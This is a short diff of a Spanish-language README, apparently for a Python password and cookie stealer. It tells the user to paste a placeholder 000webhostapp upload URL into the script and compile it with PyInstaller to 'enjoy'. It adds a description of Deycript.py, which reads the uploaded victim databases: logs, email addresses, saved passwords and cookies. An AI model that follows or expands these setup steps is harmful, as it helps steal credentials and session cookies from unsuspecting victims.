@@ -24,3 +24,7 @@ Aunque las contraseñas estan encriptadas... en las proximas actualizaciones se 
   <li>[+] Luego usas ese link en el .py Ejemplo: https://xxxxxxxxxxxxxx.000webhostapp.com/upluad.php</li>
   <li>{+] Compilas este archivo con pyintaller y disfruta</li>
 </ul>
+<br>
+<h2>Archivos</h2>
+<p>Deycript.py<br>
+  Este archivo lo que hace es abrir las bases de datos subidas y leerlas, tales como registros, correo y contraseña guadada (password ecripted) y las cookies, esta parte aun se trabaja.
